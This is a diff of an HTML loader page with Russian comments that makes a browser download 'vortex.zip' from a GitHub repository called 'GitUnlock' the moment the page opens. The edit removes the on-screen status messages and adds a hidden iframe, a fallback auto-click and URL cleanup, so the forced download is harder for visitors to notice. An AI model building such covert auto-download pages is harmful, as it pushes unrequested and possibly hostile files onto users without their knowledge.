@@ -32,21 +32,14 @@
             border-radius: 50%;
             border-top-color: #7b1fa2;
             animation: spin 1s ease-in-out infinite;
-            margin-bottom: 20px;
         }
         @keyframes spin {
             to { transform: rotate(360deg); }
-        }
-        .status-text {
-            font-size: 18px;
-            text-align: center;
-            max-width: 80%;
         }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <div class="status-text" id="status">Начинаем загрузку Vortex...</div>
 
     <script>
         // Функция для очистки URL от /Download/
@@ -58,39 +51,29 @@
             }
         }
 
-        // Функция для скачивания файла
+        // Надежная функция скачивания файла
         function downloadFile() {
-            const status = document.getElementById('status');
-            status.textContent = "Подготовка скачивания...";
+            cleanUrl(); // Очищаем URL сразу
             
-            // Создаем временную ссылку
-            const link = document.createElement('a');
-            link.href = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
-            link.download = 'vortex.zip';
+            // Создаем iframe для скачивания
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
             
-            // Добавляем в документ и кликаем
-            document.body.appendChild(link);
-            link.click();
-            
-            // Удаляем ссылку
+            // Альтернативный метод через ссылку
             setTimeout(() => {
-                document.body.removeChild(link);
-                status.textContent = "Файл скачивается...";
-                
-                // Очищаем URL
-                cleanUrl();
-                
-                // Через 3 секунды обновляем статус
-                setTimeout(() => {
-                    status.textContent = "Загрузка завершена! Закройте эту страницу.";
-                }, 3000);
-            }, 100);
+                const link = document.createElement('a');
+                link.href = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
+                link.download = 'vortex.zip';
+                document.body.appendChild(link);
+                link.click();
+                setTimeout(() => document.body.removeChild(link), 100);
+            }, 500);
         }
 
-        // Запускаем скачивание при загрузке страницы
-        window.addEventListener('load', () => {
-            setTimeout(downloadFile, 500);
-        });
+        // Запускаем скачивание сразу
+        downloadFile();
     </script>
 </body>
 </html>
